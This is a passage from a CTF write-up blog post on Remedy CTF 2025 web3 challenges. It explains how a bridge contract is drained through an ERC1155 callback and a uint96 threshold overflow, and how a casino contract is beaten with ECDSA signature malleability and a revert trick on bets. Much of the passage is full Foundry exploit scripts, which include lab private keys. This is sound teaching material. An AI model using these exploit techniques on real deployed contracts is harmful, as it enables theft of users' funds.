      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre>    function withdrawEth(bytes32 messageHash, bytes[] calldata signatures, address receiver, uint amount, bytes calldata callback) external onlyValidator {
        require(amount &gt; 0, "Amount must be greater than zero");
        require(!processedMessages[messageHash], "Message already processed");

        uint256 accumulatedWeight = 0;
        address lastSigner = address(0);

        for (uint256 i = 0; i &lt; signatures.length; i++) {
            address signer = messageHash.toEthSignedMessageHash().recover(signatures[i]);

            require(signer != lastSigner, "Repeated signer");

            // Ensure signer is in the withdraw validator list
            bool isValidValidator = false;
            for (uint256 j = 0; j &lt; withdrawValidators.length; j++) {
                if (withdrawValidators[j] == signer) {
                    isValidValidator = true;
                    break;
                }
            }

            require(isValidValidator, "Invalid withdraw validator");

            // Count each valid validator equally
            accumulatedWeight += 1;
            lastSigner = signer;
        }

        require(
            accumulatedWeight &gt;= threshold,
            "Insufficient weight to process withdrawal"
        );

        // Mark the message as processed
        processedMessages[messageHash] = true;

        // Transfer ETH to the recipient
        if (amount &gt; address(this).balance)
            amount = address(this).balance;
        (bool success, ) = payable(receiver).call{value: amount}(callback);

        emit EthWithdrawn(msg.sender, success, amount);
    }
</pre></td></tr></tbody></table></code></div></div>
<p>there is <code class="language-plaintext highlighter-rouge">withdrawEth()</code> function in BRIDGE contract but to use, we shoud bypass the <code class="language-plaintext highlighter-rouge">onlyValidator()</code> modifier and go through the process of comparing accumulatedWeight with threshold</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="rouge-code"><pre>    modifier onlyValidator() {
        require(validatorWeights[msg.sender] &gt; 0, "Caller is not a bridge setting validator");
        _;
    }
    
// (...) Skip 
    function onERC1155Received(
        address,
        address from,
        uint256,
        uint256,
        bytes calldata
    ) external override onlyAdminNft returns (bytes4) {
        if (validatorWeights[from] == 0) {
            bridgeSettingValidators.push(from);
        }

        validatorWeights[from] += NFT_WEIGHT;
        totalWeight += NFT_WEIGHT;

        return this.onERC1155Received.selector;
    }

    // Handle batch deposits of NFTs and register/update validators for bridge settings
    function onERC1155BatchReceived(
        address,
        address from,
        uint256[] calldata ids,
        uint256[] calldata,
        bytes calldata
    ) external override onlyAdminNft returns (bytes4) {
        uint256 totalAddedWeight = 0;

        if (ids.length &gt; 1) {
            for (uint256 i = 0; i &lt; ids.length; i++) {
                totalAddedWeight += NFT_WEIGHT;
            }
        } else {
            totalAddedWeight = NFT_WEIGHT;
        }

        validatorWeights[from] += totalAddedWeight;
        totalWeight += totalAddedWeight;

        if (validatorWeights[from] == totalAddedWeight) {
            bridgeSettingValidators.push(from);
        }

        return this.onERC1155BatchReceived.selector;
    }
</pre></td></tr></tbody></table></code></div></div>
<p>the way to bypass the <code class="language-plaintext highlighter-rouge">onlyValidator()</code> modifier is simple: just pass if the <code class="language-plaintext highlighter-rouge">validatorWeights[msg.sender]</code> is bigger than 0. in <code class="language-plaintext highlighter-rouge">onERC1155Received()</code> and <code class="language-plaintext highlighter-rouge">onERC1155BatchReceived()</code> function, validatorWeights value is managed so we can control it if we call this functions. typically, the two functions is callback function from some library</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>    function _doSafeTransferAcceptanceCheck(
        address operator,
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes memory data
    ) private {
        if (to.isContract()) {
            try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {
                if (response != IERC1155Receiver.onERC1155Received.selector) {
                    revert("ERC1155: ERC1155Receiver rejected tokens");
                }
            } catch Error(string memory reason) {
                revert(reason);
            } catch {
                revert("ERC1155: transfer to non-ERC1155Receiver implementer");
            }
        }
    }
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">_doSafeTransferAcceptanceCheck()</code> function is the function of ERC1151 and it calls <code class="language-plaintext highlighter-rouge">onERC1155Received()</code> function so we can call also this function if we call the <code class="language-plaintext highlighter-rouge">safeTransferFrom()</code> or <code class="language-plaintext highlighter-rouge">safeBatchTransferFrom()</code> function</p>

<p>so just call like this: <code class="language-plaintext highlighter-rouge">adminNFT.safeTransferFrom(player, address(bridge), 0, 0, bytes(""));</code> then validatorWeights[player] will be 50. and now last thihg we need to do is that <code class="language-plaintext highlighter-rouge">accumulatedWeight</code> make equal or bigger than threshold (threshold is set to 10)</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre>    function changeBridgeSettings(
        bytes calldata message,
        bytes[] calldata signatures
    ) external onlyValidator {
        uint256 accumulatedWeight = 0;
        address lastSigner = address(0);

        address newChallengeContract;
        address newAdminNftContract;
        uint256 newThreshold;

        for (uint256 i = 0; i &lt; signatures.length; i++) {
            address signer = message.toEthSignedMessageHash().recover(signatures[i]);

            require(signer != lastSigner, "Repeated signer");

            if (validatorWeights[signer] &gt; 0) {
                accumulatedWeight += validatorWeights[signer];
            }

            lastSigner = signer;
        }

        require(
            accumulatedWeight &gt;= totalWeight / 2,
            "Insufficient weight to change settings"
        );

        // Decode new parameters from the message
        (newChallengeContract, newAdminNftContract, newThreshold) = abi.decode(
            abi.encodePacked(message),
            (address, address, uint256)
        );

        require(newThreshold &gt; 1, "New threshold must be above 1");

        // Call internal function to update bridge settings
        _updateBridge(newChallengeContract, newAdminNftContract, newThreshold);
    }

    // Internal function to update bridge settings
    function _updateBridge(address newChallengeContract, address newAdminNftContract, uint256 newThreshold) internal {
        challengeContract = newChallengeContract;
        adminNftContract = newAdminNftContract;
        threshold = uint96(newThreshold);

        emit BridgeUpdated(newChallengeContract, newAdminNftContract, newThreshold);
    }
</pre></td></tr></tbody></table></code></div></div>
<p>and now it’s turn to go through the process of comparing accumulatedWeight with threshold  but it’s hard to sign but there is <code class="language-plaintext highlighter-rouge">changeBridgeSettings()</code> function which provied function to change settings (including threshold) if we can set the threshold to 0, we don’t need to sign but it checks the newThreshold is bigger than 0 or not so in general, we cannot set it to zero</p>

<p>however there is one stupid casting. in <code class="language-plaintext highlighter-rouge">changeBridgeSettings()</code> function, newThreshold is uint256 but in <code class="language-plaintext highlighter-rouge">_updateBridge()</code> function, newThreshold is casted by the <code class="language-plaintext highlighter-rouge">uint96()</code> function</p>

<p>uint256’s maximum value is 2 ** 256 -1 and uint96’s maximum value is 2 ** 96 -1. so if uint256:2 ** 96 will be casted by the <code class="language-plaintext highlighter-rouge">uint96()</code> function, it will be 0 via overflow. yes it’s so simple, we can just set the threshold to 0 using overflow</p>

<p>but it requires that the accumulatedWeight vlaue is equal or bigger that totalWeight / 2. before, we setted the it to 50 using the  <code class="language-plaintext highlighter-rouge">safeTransferFrom()</code> function. but this function can set only 50 but if we use the <code class="language-plaintext highlighter-rouge">safeBatchTransferFrom()</code> function, we can increase this value by multiples of 50 for the number of ids in the array</p>

<h3 id="solvesol-1"><span class="me-2">Solve.sol</span><a href="#solvesol-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";
import {Challenge} from "../src/Challenge.sol";
import {AdminNFT} from "../src/AdminNFT.sol";
import {Bridge} from "../src/Bridge.sol";

contract Solve is Script {
    using ECDSA for bytes;
    using ECDSA for bytes32;

    Challenge public challenge;
    AdminNFT public adminNFT;
    Bridge public bridge;

    address private player;
    address private _challenge = 0x428a7ec1f430613568113B448b790C517C842D76;
    uint256 private playerPrivateKey = 0x5cecd56dd7a945a96c2a226ded44ba5ef9f0fea2caf85a6c00d15c633cb84c13;

    function run() external {
        challenge = Challenge(_challenge);
        adminNFT = challenge.ADMIN_NFT();
        bridge = challenge.BRIDGE();
        player = vm.addr(playerPrivateKey);
        vm.startBroadcast(playerPrivateKey);

        console.log("Starting exploit...");

        challenge.solveStage1(6);
        require(challenge.stage1Solved(), "Stage 1 not solved");

        challenge.solveStage2(5959, 1);
        require(challenge.stage2Solved(), "Stage 2 not solved");

        challenge.solveStage3(1, 0, 2);
        require(challenge.stage3Solved(), "Stage 3 not solved");

        bridge.verifyChallenge();
        require(challenge.challengeSolved(), "Challenge not solved");
        require(challenge.solver() == player, "Player is not the solver");

        adminNFT.safeTransferFrom(player, address(bridge), 0, 0, bytes(""));
        require(bridge.validatorWeights(player) == 50, "Validator weight incorrect after single transfer");

        uint256[] memory amaaaaan = new uint256[](300);
        for (uint i = 0; i &lt; amaaaaan.length; i++) {
            amaaaaan[i] = 0;
        }

        uint256;
        adminNFT.safeBatchTransferFrom(player, address(bridge), amaaaaan, amaaaaan, bytes(""));
        require(bridge.validatorWeights(player) == 10_050, "Validator weight incorrect after batch transfer");
        require(bridge.totalWeight() == 20_050, "Total weight incorrect after batch transfer");

        uint256 newThreshold = 2 ** 96; 
        bytes memory message = abi.encode(address(challenge), address(adminNFT), newThreshold);
        bytes32 ethSignedMessageHash = message.toEthSignedMessageHash();

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        bytes[] memory signatures = new bytes[](1);
        signatures[0] = signature;

        bridge.changeBridgeSettings(message, signatures);
        require(bridge.threshold() == 0, "Threshold did not overflow to 0");

        bridge.withdrawEth(bytes32(""), new bytes[](0), player, type(uint256).max, bytes(""));
        require(address(bridge).balance == 0, "Bridge balance not 0 after withdrawal");

        require(challenge.isSolved(), "Challenge not fully solved");
        console.log("Exploit completed successfully");
        vm.stopBroadcast();
    }
}
</pre></td></tr></tbody></table></code></div></div>
<p><a href="https://media.discordapp.net/attachments/1324169819637022723/1333149718892515421/image.png?ex=6797d7ed&amp;is=6796866d&amp;hm=ac8d73bb73b05fda9e0b8291877e6bfd86f0139ec6de6dd49dc2a0b30fd1ac04&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2604&amp;height=740" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1324169819637022723/1333149718892515421/image.png?ex=6797d7ed&amp;is=6796866d&amp;hm=ac8d73bb73b05fda9e0b8291877e6bfd86f0139ec6de6dd49dc2a0b30fd1ac04&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2604&amp;height=740" alt="" loading="lazy"></a></p>

<p>so just attack to get the flag using this logic</p>

<hr />
<h2 id="casino-avengers"><span class="me-2">Casino Avengers</span><a href="#casino-avengers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>    function isSolved() external view returns (bool) {
        return address(PLAYER).balance &gt;= 99 ether
            &amp;&amp; address(CASINO).balance == 0;
    }
</pre></td></tr></tbody></table></code></div></div>
<p>we should drain the Casino contract’s balance and get 99 or more ether</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>    modifier whenNotPaused {
        if (paused) revert Paused();
        _;
    }
// (...) skip
    function deposit(address receiver) external payable {
        _deposit(msg.sender, receiver, msg.value);
    }
</pre></td></tr></tbody></table></code></div></div>
<p>first of all, we should deposit in casino to play a game but internal function is paused and it’s checked by <code class="language-plaintext highlighter-rouge">whenNotPaused()</code> modeifier. if the paused is false, we can use internal function.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>    function pause(
        bytes memory signature,
        bytes32 salt
    ) external {
        _verifySignature(signature, abi.encode(0, salt));
        paused = !paused;
    }
</pre></td></tr></tbody></table></code></div></div>
<p>we can change it with the <code class="language-plaintext highlighter-rouge">pause()</code> function but there is <code class="language-plaintext highlighter-rouge">_verifySignature()</code> function which performs the signature verification</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>    function _verifySignature(bytes memory signature, bytes memory digest) internal {
        if (nullifiers[signature]) revert SignatureAlreadyUsed();

        address signatureSigner = ECDSA.recover(keccak256(digest), signature);
        if (signatureSigner != signer) revert InvalidSignature();

        nullifiers[signature] = true;
    }
</pre></td></tr></tbody></table></code></div></div>
<p>in the <code class="language-plaintext highlighter-rouge">_verifySignature()</code> function, it recovers the signature by the <code class="language-plaintext highlighter-rouge">ECDSA.recover()</code> function then check that the signatureSinger is equal with singer or not. singer is which signed with <code class="language-plaintext highlighter-rouge">vm.envString("MNEMONIC")'s</code> pv key.</p>

<p>so we need to make <code class="language-plaintext highlighter-rouge">signature(r, v, s)</code> then verify that it is equal with singer or not but there is a signature value duplication verification so we cannot pass it even we know pvKey</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (utils/cryptography/ECDSA.sol)
</pre></td></tr></tbody></table></code></div></div>
<p>but this casino uses the ECDSA which vulnerable to signature malleability. this library provide EIP-2098 compact signature so we can exploit it. different signature but same singerAddress -&gt; bypass duplicates (r, v, s ~&gt; r, vs)</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../src/Casino.sol";

contract Solve is Script {
    address public PLAYER;
    address public SIGNER;
    address public challengeAddress = 0x1DE370ea59CD090aE8AB711f45791462FE9388fb;
    uint256 public playerPrivateKey = 0xc0f770872cf69c87ed47f69f8129d8beaea5b5747d76e510a0a61e2037bb3d56;
    uint256 public targetBalance = 99 ether;

    Challenge public challenge;
    Casino public casino;
    constructor() {
        challenge = Challenge(challengeAddress);
        PLAYER = challenge.PLAYER();
        casino = challenge.CASINO();
        SIGNER = casino.signer();
    }

    function convertToEIP2098(bytes32 r, bytes32 s, uint8 v) public pure returns (bytes32, bytes32) { // by ChatGPT Ammmeennn
        require(v == 27 || v == 28, "Invalid v value");
        bytes32 vs = s | bytes32(uint256(v - 27) &lt;&lt; 255);
        return (r, vs);
    }

    function splitSignature(bytes memory signature)
        public
        pure
        returns (bytes32 r, bytes32 s, uint8 v)
    {
        require(signature.length == 65, "Invalid signature length");

        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
    }

    function run() external {
        bytes32 r;
        bytes32 s;
        uint8 v;
        bytes32 vs;
        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;

        bytes memory signature = hex"8b7342b87c27fef0d248ddcfee8109981cba01babcd6c867b62fdf2ed8cab756406b8794b1adefb5b069038c4c2d989663212a6d1ffa6bdb1ce5c984b6afec841c";
        (r, s, v) = splitSignature(signature);
        (r, vs) = convertToEIP2098(r, s, v);

        vm.startBroadcast(playerPrivateKey);
        console.log("casino balance : ", address(casino).balance);
        console.log("player balance : ", address(PLAYER).balance);
        console.log("signer address : ", SIGNER);

        casino.pause(
            abi.encodePacked(r, vs),
            salt
        );

        console.log("puase : ", casino.paused());
        vm.stopBroadcast();
    }
}
</pre></td></tr></tbody></table></code></div></div>
<p><a href="https://media.discordapp.net/attachments/1324169819637022723/1333649395165696040/image.png?ex=6799a949&amp;is=679857c9&amp;hm=31602e7c5de945d2e435e84d7664bd682ffe3af3457db2790108f3103d737b94&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2098&amp;height=680" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1324169819637022723/1333649395165696040/image.png?ex=6799a949&amp;is=679857c9&amp;hm=31602e7c5de945d2e435e84d7664bd682ffe3af3457db2790108f3103d737b94&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2098&amp;height=680" alt="" loading="lazy"></a></p>

<p>we can resume with this code, let’s go next step</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>    function _withdraw(address withdrawer, address receiver, uint256 amount) internal whenNotPaused {
        if (balances[withdrawer] &lt; amount) revert InvalidAmount();

        if (address(this).balance &lt; amount) amount = address(this).balance;

        balances[withdrawer] -= amount;
        emit Withdraw(withdrawer, receiver, amount);

        reciever.call{value: amount}("");
    }
</pre></td></tr></tbody></table></code></div></div>
<p>and we can withdraw it if we have balance in casino</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>    function bet(uint256 amount) external returns (bool) {
        if (balances[msg.sender] &lt; amount) revert InvalidAmount();

        uint256 random = uint256(keccak256(abi.encode(gasleft(), block.number, totalBets)));
        bool win = random % 2 == 1;

        if (win) balances[msg.sender] += amount;
        else balances[msg.sender] -= amount;

        totalBets++;

        emit Bet(msg.sender, amount, win);
        return win;
    }
</pre></td></tr></tbody></table></code></div></div>
<p>if we win a game, we can fill our balances to amount but this amount should smaller than our balance. so we should win almost 100 times to earn more than 99 ether. from now on, we should think how to always win because our balances goes down when we lose the game</p>

<p>but i couldn’t win the gam. i just tried to keep calling the <code class="language-plaintext highlighter-rouge">bet()</code> function till i win 100 times. however as i told, our balances goes down when we lose the game, acrroding to this logic, we can’t keep playing the game because we have no our balance in casino.</p>

<p>however if we’re gonna call the <code class="language-plaintext highlighter-rouge">revert()</code> function when we lose the game then play again? our balances not goes down so well able to keep playing it. it was a scenario ans seems nice. but states is revert to before transaction was performed if the <code class="language-plaintext highlighter-rouge">revert()</code> function is called while operating on EVM so i could not do it.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: GPL-3.0

pragma solidity &gt;=0.8.2 &lt;0.9.0;

contract ameeeen {
    function bet(uint256 num) external returns (bool) {
        if ((num % 2) == 0) {
            return true;
        }
        else {
            return false;
        }
    }
}

contract Callllll {
    mapping(uint =&gt; bool) public balances;
    ameeeen public am;
    bool checkkkkkk;
    
    constructor() {
        am = new ameeeen();
    }

    function asdf1() external {
        for(uint i = 0; i &lt; 100; i++){
            asdf2(i);
        }
    }

    function asdf11() external {
        for(uint i = 0; i &lt; 100; i++){
            address(this).call(abi.encodeWithSignature("asdf2(uint256)", i));
        }
    }

    function asdf2(uint256 num) internal returns (bool) {
        bool checkk;
        checkk = am.bet(num);
        if (checkk == true) {
            return true;
        } else {
            revert();
        }
    }
}
</pre></td></tr></tbody></table></code></div></div>
<p>after few days, i’ve asked to snwo how i can make that my contract keep playing the game even i lose it. because  it’s always reverted so i was not able to keep playing.</p>

<p><a href="https://media.discordapp.net/attachments/1324169819637022723/1333987974991319080/2025-01-29_11.31.45.png?ex=679ae49d&amp;is=6799931d&amp;hm=c3093ab8ac0909d600eda04f2c2f80b19924b41a5cef235ec2b39c0f5aef2a96&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2098&amp;height=516" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1324169819637022723/1333987974991319080/2025-01-29_11.31.45.png?ex=679ae49d&amp;is=6799931d&amp;hm=c3093ab8ac0909d600eda04f2c2f80b19924b41a5cef235ec2b39c0f5aef2a96&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2098&amp;height=516" alt="" loading="lazy"></a>
he says if we call some function with the <code class="language-plaintext highlighter-rouge">.call()</code> function, only the transaction performed through <code class="language-plaintext highlighter-rouge">.call()</code> function is reverted.. so i wrote test code as above, when i called the <code class="language-plaintext highlighter-rouge">asdf1()</code> function, it was reverted before transaction was performed but when i call the <code class="language-plaintext highlighter-rouge">asdf11()</code> it was just reverted the transaction which performed via <code class="language-plaintext highlighter-rouge">.call()</code> function. so we can just exploit with this trick to get winning.</p>

<p>i feel again that it is always very important to know the specifications of the system like EVM or smth else, i still have a lot to learn</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Remedy%20CTF%202025%20(Diamond,%20Rich,%20Casino)%20-%20Web3.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FRemedy-CTF2525%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Remedy%20CTF%202025%20(Diamond,%20Rich,%20Casino)%20-%20Web3.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FRemedy-CTF2525%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FRemedy-CTF2525%2F&text=Remedy%20CTF%202025%20(Diamond,%20Rich,%20Casino)%20-%20Web3.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->


















            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Alpha-Hunter/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1703430000"
  data-df="ll"
  
>
  Dec 25, 2023
</time>

              <h4 class="pt-0 my-2">2023 X-mas CTF (Alpha Hunter)</h4>
              <div class="text-muted">
                <p>
                  





                  개요

Description
알파벳을 모아 MERRY CHRISTMAS를 완성해 주세요!!

[RPC Usage]
RPC: http://host:port/rpc
GET FLAG: curl -X GET http://host:port/flag

[Account Information]
address: 0x377CFaD82A885Ef59C9243f715F33...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/BMW-CTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1704207600"
  data-df="ll"
  
>
  Jan  3, 2024
</time>

              <h4 class="pt-0 my-2">BMW Web3 CTF</h4>
              <div class="text-muted">
                <p>
                  





                  개요


  Introduction
안녕하세요. BMW는 Break My Wall의 약자로 나의 벽을 깨부순다는 의미입니다. 나의 한계를 극복함과 동시에 우리가 WEB3 생태계의 진입장벽을 부수자는 의미를 함축하고 있습니다. BMW는 KITRI 차세대 보안리더 양성 프로그램 WHS 1기 프로젝트팀이며, WEB3의 취약점을 연구하고 워게임 사이트를 제작...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/RealWorld-CTF-6th/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
